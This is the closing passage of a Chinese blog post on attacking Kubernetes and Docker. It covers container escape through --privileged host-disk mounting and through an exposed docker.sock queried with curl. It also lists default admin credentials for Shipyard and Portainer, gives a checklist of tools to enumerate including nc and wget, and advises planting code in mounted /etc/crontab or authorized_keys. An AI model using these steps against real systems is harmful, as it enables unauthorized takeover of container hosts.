+<h5 id="–privileged-利用"><a href="#–privileged-利用" class="headerlink" title="–privileged 利用"></a>–privileged 利用</h5><p>启动Docker容器。使用此参数时，容器可以完全访问所有设备，并且不受seccomp，AppArmor和Linux capabilities的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看磁盘文件: fdisk -l</span><br><span class="line">新建目录以备挂载: mkdir /aa</span><br><span class="line">将宿主机/dev/sda1目录挂载至容器内 /aa: mount /dev/sda1 /aa</span><br><span class="line">即可写文件获取权限或数据</span><br></pre></td></tr></table></figure></p>
+<h5 id="docker-sock暴露到容器内部"><a href="#docker-sock暴露到容器内部" class="headerlink" title="docker.sock暴露到容器内部"></a>docker.sock暴露到容器内部</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在容器中：</span><br><span class="line">find / -name docker.sock</span><br><span class="line">连接 </span><br><span class="line">curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json</span><br></pre></td></tr></table></figure>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/4ea2a8c35ab1f0553c3d589d1476f0d8-79487" class="en-media" width="1144" height="384"><br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/dd11b65266595383cf80905f45f227ab-237594" class="en-media" width="2422" height="532"><br>就可以利用api进行控制宿主机</p>
+<h5 id="Shipyard和Portainer"><a href="#Shipyard和Portainer" class="headerlink" title="Shipyard和Portainer"></a>Shipyard和Portainer</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shipyard 是一个基于 Web 的 Docker 管理工具，支持多 host，可以把多个 Docker host 上的 containers统一管理；可以查看 images，甚至 build images；并提供 RESTful API 等等。Shipyard 要管理和控制Docker host 的话需要先修改 Docker host 上的默认配置使其支持远程管理。</span><br><span class="line"> </span><br><span class="line">Portainer是Docker的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Shipyard</span><br><span class="line">http://ip:8080，默认用户名：admin，密码：shipyard</span><br><span class="line"></span><br><span class="line">Portainer</span><br><span class="line">http://ip:9000 默认用户名 admin</span><br></pre></td></tr></table></figure>
+<h4 id="容器信息收集"><a href="#容器信息收集" class="headerlink" title="容器信息收集"></a>容器信息收集</h4><h5 id="可用命令收集"><a href="#可用命令收集" class="headerlink" title="可用命令收集"></a>可用命令收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot;curl&quot;,</span><br><span class="line">&quot;wget&quot;,</span><br><span class="line">&quot;nc&quot;,</span><br><span class="line">&quot;netcat&quot;,</span><br><span class="line">&quot;kubectl&quot;,</span><br><span class="line">&quot;docker&quot;,</span><br><span class="line">&quot;find&quot;,</span><br><span class="line">&quot;ps&quot;,</span><br><span class="line">&quot;java&quot;,</span><br><span class="line">&quot;python&quot;,</span><br><span class="line">&quot;python3&quot;,</span><br><span class="line">&quot;php&quot;,</span><br><span class="line">&quot;node&quot;,</span><br><span class="line">&quot;npm&quot;,</span><br><span class="line">&quot;apt&quot;,</span><br><span class="line">&quot;yum&quot;,</span><br><span class="line">&quot;dpkg&quot;,</span><br><span class="line">&quot;nginx&quot;,</span><br><span class="line">&quot;httpd&quot;,</span><br><span class="line">&quot;apache&quot;,</span><br><span class="line">&quot;apache2&quot;,</span><br><span class="line">&quot;ssh&quot;,</span><br><span class="line">&quot;mysql&quot;,</span><br><span class="line">&quot;mysql-client&quot;,</span><br><span class="line">&quot;git&quot;,</span><br><span class="line">&quot;svn&quot;,</span><br><span class="line">&quot;vi&quot;,</span><br><span class="line">&quot;capsh&quot;,</span><br><span class="line">&quot;mount&quot;,</span><br><span class="line">&quot;fdisk&quot;,</span><br></pre></td></tr></table></figure>
+<h5 id="容器目录挂载情况"><a href="#容器目录挂载情况" class="headerlink" title="容器目录挂载情况"></a>容器目录挂载情况</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检查挂载到当前容器内的目录和文件，一些挂载到容器内部的敏感目录如/etc,/root等可以提供逃逸机会，如将恶意代码写入/etc/crontab或/root/.ssh/authorized_keys.</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/07/01/利用文本做通道/" rel="next" title="利用file做堡垒机数据通道">
+                <i class="fa fa-chevron-left"></i> 利用file做堡垒机数据通道
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg"
+                alt="yangge" />
+            
+              <p class="site-author-name" itemprop="name">yangge</p>
+              <p class="site-description motion-element" itemprop="description">一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yang8e/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:470818631@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-qq"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#容器扫描器"><span class="nav-number">1.</span> <span class="nav-text">容器扫描器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建集群"><span class="nav-number">3.</span> <span class="nav-text">创建集群</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#minikube"><span class="nav-number">3.1.</span> <span class="nav-text">minikube</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击kubernets"><span class="nav-number">4.</span> <span class="nav-text">攻击kubernets</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#容器安全"><span class="nav-number">4.1.</span> <span class="nav-text">容器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CVE-2019-5021"><span class="nav-number">4.1.1.</span> <span class="nav-text">CVE-2019-5021</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CVE-2019-14271"><span class="nav-number">4.1.2.</span> <span class="nav-text">CVE-2019-14271</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CVE-2020-15257"><span class="nav-number">4.1.3.</span> <span class="nav-text">CVE-2020-15257</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#docker-remote-api-未授权访问"><span class="nav-number">4.1.4.</span> <span class="nav-text">docker remote api 未授权访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Docker-python-api"><span class="nav-number">4.1.5.</span> <span class="nav-text">Docker python api</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#–privileged-利用"><span class="nav-number">4.1.6.</span> <span class="nav-text">–privileged 利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#docker-sock暴露到容器内部"><span class="nav-number">4.1.7.</span> <span class="nav-text">docker.sock暴露到容器内部</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shipyard和Portainer"><span class="nav-number">4.1.8.</span> <span class="nav-text">Shipyard和Portainer</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#容器信息收集"><span class="nav-number">4.2.</span> <span class="nav-text">容器信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#可用命令收集"><span class="nav-number">4.2.1.</span> <span class="nav-text">可用命令收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#容器目录挂载情况"><span class="nav-number">4.2.2.</span> <span class="nav-text">容器目录挂载情况</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yangge</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://yangge.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yangge.me/2021/12/24/云/';
+          this.page.identifier = '2021/12/24/云/';
+          this.page.title = 'k8s学习与攻击';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://yangge.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
